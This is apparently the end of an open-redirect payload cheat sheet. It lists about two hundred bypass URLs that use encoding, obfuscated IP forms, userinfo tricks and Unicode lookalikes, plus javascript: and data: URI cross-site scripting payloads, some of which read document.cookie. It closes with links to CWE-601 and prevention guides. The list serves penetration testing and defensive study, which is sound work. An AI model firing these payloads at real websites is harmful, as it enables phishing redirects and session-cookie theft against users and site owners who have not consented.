https://google.com//
https://example.com@google.com//
//https://google.com//
//https://example.com@google.com//
//google.com/%2e%2e%2f
//example.com@google.com/%2e%2e%2f
///google.com/%2e%2e%2f
///example.com@google.com/%2e%2e%2f
////google.com/%2e%2e%2f
////example.com@google.com/%2e%2e%2f
https://google.com/%2e%2e%2f
https://example.com@google.com/%2e%2e%2f
//https://google.com/%2e%2e%2f
//https://example.com@google.com/%2e%2e%2f
///google.com/%2e%2e
///example.com@google.com/%2e%2e
////google.com/%2e%2e
////example.com@google.com/%2e%2e
https:///google.com/%2e%2e
https:///example.com@google.com/%2e%2e
//https:///google.com/%2e%2e
//example.com@https:///google.com/%2e%2e
/https://google.com/%2e%2e
/https://example.com@google.com/%2e%2e
///google.com/%2f%2e%2e
///example.com@google.com/%2f%2e%2e
////google.com/%2f%2e%2e
////example.com@google.com/%2f%2e%2e
https:///google.com/%2f%2e%2e
https:///example.com@google.com/%2f%2e%2e
/https://google.com/%2f%2e%2e
/https://example.com@google.com/%2f%2e%2e
/https:///google.com/%2f%2e%2e
/https:///example.com@google.com/%2f%2e%2e
/%09/google.com
/%09/example.com@google.com
//%09/google.com
//%09/example.com@google.com
///%09/google.com
///%09/example.com@google.com
////%09/google.com
////%09/example.com@google.com
https://%09/google.com
https://%09/example.com@google.com
/%5cgoogle.com
/%5cexample.com@google.com
//%5cgoogle.com
//%5cexample.com@google.com
///%5cgoogle.com
///%5cexample.com@google.com
////%5cgoogle.com
////%5cexample.com@google.com
https://%5cgoogle.com
https://%5cexample.com@google.com
/https://%5cgoogle.com
/https://%5cexample.com@google.com
https://google.com
https://example.com@google.com
javascript:alert(1);
javascript:alert(1)
//javascript:alert(1);
/javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
//google.com
https:google.com
//google%E3%80%82com
\/\/google.com/
/\/google.com/
//google%00.com
https://example.com/https://google.com/
";alert(0);//
javascript://example.com?%a0alert%281%29
http://0xd8.0x3a.0xd6.0xce
http://example.com@0xd8.0x3a.0xd6.0xce
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http://0xd83ad6ce
http://example.com@0xd83ad6ce
http://3H6k7lIAiqjfNeN@0xd83ad6ce
http://XY>.7d8T\205pZM@0xd83ad6ce
http://3627734734
http://example.com@3627734734
http://3H6k7lIAiqjfNeN@3627734734
http://XY>.7d8T\205pZM@3627734734
http://472.314.470.462
http://example.com@472.314.470.462
http://3H6k7lIAiqjfNeN@472.314.470.462
http://XY>.7d8T\205pZM@472.314.470.462
http://0330.072.0326.0316
http://example.com@0330.072.0326.0316
http://3H6k7lIAiqjfNeN@0330.072.0326.0316
http://XY>.7d8T\205pZM@0330.072.0326.0316
http://00330.00072.0000326.00000316
http://example.com@00330.00072.0000326.00000316
http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
http://[::216.58.214.206]
http://example.com@[::216.58.214.206]
http://3H6k7lIAiqjfNeN@[::216.58.214.206]
http://XY>.7d8T\205pZM@[::216.58.214.206]
http://[::ffff:216.58.214.206]
http://example.com@[::ffff:216.58.214.206]
http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http://0xd8.072.54990
http://example.com@0xd8.072.54990
http://3H6k7lIAiqjfNeN@0xd8.072.54990
http://XY>.7d8T\205pZM@0xd8.072.54990
http://0xd8.3856078
http://example.com@0xd8.3856078
http://3H6k7lIAiqjfNeN@0xd8.3856078
http://XY>.7d8T\205pZM@0xd8.3856078
http://00330.3856078
http://example.com@00330.3856078
http://3H6k7lIAiqjfNeN@00330.3856078
http://XY>.7d8T\205pZM@00330.3856078
http://00330.0x3a.54990
http://example.com@00330.0x3a.54990
http://3H6k7lIAiqjfNeN@00330.0x3a.54990
http://XY>.7d8T\205pZM@00330.0x3a.54990
http:0xd8.0x3a.0xd6.0xce
http:example.com@0xd8.0x3a.0xd6.0xce
http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http:0xd83ad6ce
http:example.com@0xd83ad6ce
http:3H6k7lIAiqjfNeN@0xd83ad6ce
http:XY>.7d8T\205pZM@0xd83ad6ce
http:3627734734
http:example.com@3627734734
http:3H6k7lIAiqjfNeN@3627734734
http:XY>.7d8T\205pZM@3627734734
http:472.314.470.462
http:example.com@472.314.470.462
http:3H6k7lIAiqjfNeN@472.314.470.462
http:XY>.7d8T\205pZM@472.314.470.462
http:0330.072.0326.0316
http:example.com@0330.072.0326.0316
http:3H6k7lIAiqjfNeN@0330.072.0326.0316
http:XY>.7d8T\205pZM@0330.072.0326.0316
http:00330.00072.0000326.00000316
http:example.com@00330.00072.0000326.00000316
http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
http:[::216.58.214.206]
http:example.com@[::216.58.214.206]
http:3H6k7lIAiqjfNeN@[::216.58.214.206]
http:XY>.7d8T\205pZM@[::216.58.214.206]
http:[::ffff:216.58.214.206]
http:example.com@[::ffff:216.58.214.206]
http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http:0xd8.072.54990
http:example.com@0xd8.072.54990
http:3H6k7lIAiqjfNeN@0xd8.072.54990
http:XY>.7d8T\205pZM@0xd8.072.54990
http:0xd8.3856078
http:example.com@0xd8.3856078
http:3H6k7lIAiqjfNeN@0xd8.3856078
http:XY>.7d8T\205pZM@0xd8.3856078
http:00330.3856078
http:example.com@00330.3856078
http:3H6k7lIAiqjfNeN@00330.3856078
http:XY>.7d8T\205pZM@00330.3856078
http:00330.0x3a.54990
http:example.com@00330.0x3a.54990
http:3H6k7lIAiqjfNeN@00330.0x3a.54990
http:XY>.7d8T\205pZM@00330.0x3a.54990
〱google.com
〵google.com
ゝgoogle.com
ーgoogle.com
ｰgoogle.com
/〱google.com
/〵google.com
/ゝgoogle.com
/ーgoogle.com
/ｰgoogle.com
%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
http://%67%6f%6f%67%6c%65%2e%63%6f%6d
<>javascript:alert(1);
<>//google.com
//google.com\@example.com
https://:@google.com\@example.com
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
ja\nva\tscript\r:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
\152\141\166\141\163\143\162\151\160\164\072alert(1)
http://google.com:80#@example.com/
http://google.com:80?@example.com/
http://3H6k7lIAiqjfNeN@example.com+@google.com/
http://XY>.7d8T\205pZM@example.com+@google.com/
http://3H6k7lIAiqjfNeN@example.com@google.com/
http://XY>.7d8T\205pZM@example.com@google.com/
http://example.com+&@google.com#+@example.com/
http://google.com\texample.com/
//google.com:80#@example.com/
//google.com:80?@example.com/
//3H6k7lIAiqjfNeN@example.com+@google.com/
//XY>.7d8T\205pZM@example.com+@google.com/
//3H6k7lIAiqjfNeN@example.com@google.com/
//XY>.7d8T\205pZM@example.com@google.com/
//example.com+&@google.com#+@example.com/
//google.com\texample.com/
//;@google.com
http://;@google.com
@google.com
javascript://https://example.com/?z=%0Aalert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
http://google.com%2f%2f.example.com/
http://google.com%5c%5c.example.com/
http://google.com%3F.example.com/
http://google.com%23.example.com/
http://example.com:80%40google.com/
http://example.com%2egoogle.com/
/x:1/:///%01javascript:alert(document.cookie)/
/https:/%5cgoogle.com/
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
/http://google.com
/%2f%2fgoogle.com
/google.com/%2f%2e%2e
/http:/google.com
/.google.com
///\;@google.com
///google.com
/////google.com/
```

#### References :

* [CWE Entry 601 on Open Redirects.](http://cwe.mitre.org/data/definitions/601.html)

* [WASC Article on URL Redirector Abuse](http://projects.webappsec.org/w/page/13246981/URL%20Redirector%20Abuse)

* [Google blog article on the dangers of open redirects.](http://googlewebmastercentral.blogspot.com/2009/01/open-redirect-urls-is-your-site-being.html)

* [Preventing Open Redirection Attacks (C#).](http://www.asp.net/mvc/tutorials/security/preventing-open-redirection-attacks)
